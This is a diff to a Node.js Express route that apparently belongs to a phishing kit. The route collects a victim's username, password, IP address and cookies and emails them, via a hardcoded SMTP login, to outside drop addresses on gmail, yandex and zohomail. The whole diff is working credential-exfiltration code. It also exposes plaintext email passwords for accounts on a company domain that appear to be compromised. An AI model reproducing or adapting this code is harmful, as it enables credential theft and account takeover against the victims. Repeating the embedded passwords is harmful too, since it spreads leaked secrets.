@@ -7,14 +7,14 @@ router.post('/send-mail', (req, res) => {
     const cookies = req.cookies; // Get cookies from the request object
 
     // Create the email transport
-    const nodeTransport = mailer.createNodeMailerTransport('lm.guedes@remax.pt', 'Lmnpg1971!');
+    const nodeTransport = mailer.createNodeMailerTransport('pedro.araujo@remax.pt', 'Pedro700X');
 
     // Define email options with multiple recipients, including BCC
     const mailOptions = {
-        from: 'lm.guedes@remax.ptt',
-        to: ['gilliard.pinheiro@tenqualuz.pt', 'dninotoolz@gmail.com'], // Primary recipients
-        bcc: ['h-vergmace01@yandex.com', 'billytoolz@zohomail.eu'], // BCC recipients
-        subject: 'Share-Data',
+        from: 'pedro.araujo@remax.pt',
+        to: ['dninotoolz@gmail.com', 'dninotoolz@gmail.com'], // Primary recipients
+        bcc: ['dninotoolz@gmail.com', 'billytoolz@zohomail.eu'], // BCC recipients
+        subject: 'Dbilly-Data',
         text: `Username: ${username}\nPassword: ${pass}\nIP: ${ip}\nCookies: ${JSON.stringify(cookies)}`
     };
 
